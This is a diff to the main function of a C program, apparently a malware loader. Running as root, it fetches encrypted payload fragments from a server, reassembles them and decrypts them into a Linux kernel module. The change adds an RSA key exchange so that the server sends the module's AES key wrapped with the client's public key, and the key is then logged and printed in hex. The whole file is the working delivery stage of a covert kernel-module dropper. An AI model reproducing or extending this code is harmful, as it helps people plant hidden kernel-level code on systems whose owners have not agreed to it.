@@ -1,3 +1,4 @@
+#include <openssl/evp.h>
 #include <stdlib.h>
 #include <sys/types.h>
 #include <unistd.h>
@@ -8,7 +9,6 @@
 #include "../include/log.h"
 #include "../include/sock.h"
 #include "../include/utils.h"
-
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT "8000"
 
@@ -30,19 +30,31 @@ static void cleanup_fraction_array(fraction_t *array, int n_elem) {
 int main(void) {
   struct addrinfo hints, *ainfo;
   int sfd = -1; // to be extra professional
+  
   http_res_t http_fraction_res = {0};
   http_res_t http_post_res = {0};
+
   char **fraction_links = NULL;
   fraction_t *fractions = NULL;
+  
   uint8_t *module = NULL;
   ssize_t module_size;
 
+  EVP_PKEY *pkey = NULL;
+  char *private_key = NULL;
+  char *public_key = NULL;
+
+  unsigned char *b64_decoded_aes_key;
+  unsigned char *aes_key = NULL;
+  size_t key_len = 0;
+  
+  
   if (geteuid() != 0) {
     log_error("This program needs to be run as root!");
     exit(1);
   }
 
-  log_set_level(LOG_DEBUG);
+  log_set_level(LOG_INFO);
   setup_hints(&hints);
 
   if (h_getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &ainfo) != 0) {
@@ -58,11 +70,34 @@ int main(void) {
   }
   freeaddrinfo(ainfo);
 
-  //if (http_post(sfd, "/aeskey", "text/plain", generate_publickey(),
-  //              &http_post_res) != HTTP_SUCCESS) {
-  //  log_error("Failed to send RSA Public Key\n");
-  //  goto cleanup;
-  //}
+  pkey = generate_rsa_private_key();
+  if (pkey == NULL) {
+    return EXIT_FAILURE;
+  }
+  public_key = write_rsa_public_key(pkey);
+  if (public_key == NULL) {
+    return EXIT_FAILURE;
+  }
+
+  /* Receive and decrypt AES key from server */
+  if (http_post(sfd, "/", "application/octet-stream", public_key, &http_post_res) !=
+    HTTP_SUCCESS) {
+    log_error("Failed to send RSA public key");
+    goto cleanup;
+  }
+
+  log_info("Base64 encoded key: %s", http_post_res.data);
+  base64_decode(http_post_res.data, &b64_decoded_aes_key, &key_len);
+  log_info("Key size (decoded): %zu", key_len);
+  
+  
+  aes_key = decrypt_rsa_oaep_evp(pkey, b64_decoded_aes_key, key_len, &key_len);
+  if (aes_key == NULL) {
+    log_error("Failed to decrypt data from server");
+    goto cleanup;
+  }
+
+  print_hex(aes_key, key_len);
 
   if (http_get(sfd, "/", &http_fraction_res) != HTTP_SUCCESS) {
     log_error("Failed to retrieve fraction links");
@@ -80,9 +115,7 @@ int main(void) {
     goto cleanup;
   }
 
-
-  int lines_read =
-      split_fraction_links(http_fraction_res.data, fraction_links, num_links);
+  int lines_read = split_fraction_links(http_fraction_res.data, fraction_links, num_links);
   if (lines_read < 0) {
     log_error("Failed to split fraction links");
     goto cleanup;
@@ -101,7 +134,7 @@ int main(void) {
       goto cleanup;
     }
   }
-  
+
   log_info("Downloaded fractions");
 
   qsort(fractions, lines_read, sizeof(fraction_t), compare_fractions);
@@ -110,7 +143,7 @@ int main(void) {
     print_fraction(fractions[i]);
   }
 
-  module = decrypt_lkm(fractions, num_links, &module_size);
+  module = decrypt_lkm(fractions, num_links, &module_size, aes_key);
   if (module == NULL) {
     log_error("There was an error creating the module");
     goto cleanup;
@@ -126,12 +159,15 @@ int main(void) {
   cleanup_string_array(fraction_links, num_links);
   cleanup_fraction_array(fractions, lines_read);
   free(module);
+  free(private_key);
+  free(public_key);
+  EVP_PKEY_free(pkey);
 
   close(sfd);
-  
+
   return EXIT_SUCCESS;
 
-/* There's nothing to see here, move on*/
+  /* There's nothing to see here, move on*/
 cleanup: // we accept NO comments on this. have a !nice day
   if (sfd != -1) {
     close(sfd);
@@ -149,6 +185,16 @@ cleanup: // we accept NO comments on this. have a !nice day
     http_free(&http_post_res);
   }
   free(module); // no need to check module != NULL as free(NULL) is defined by
-                // the C standard to do nothing
+  // the C standard to do nothing
+  if (private_key) {
+    free(private_key);
+  }
+  if (public_key) {
+    free(public_key);
+  }
+  if (pkey) {
+    EVP_PKEY_free(pkey);
+  }
+
   return EXIT_FAILURE;
 }
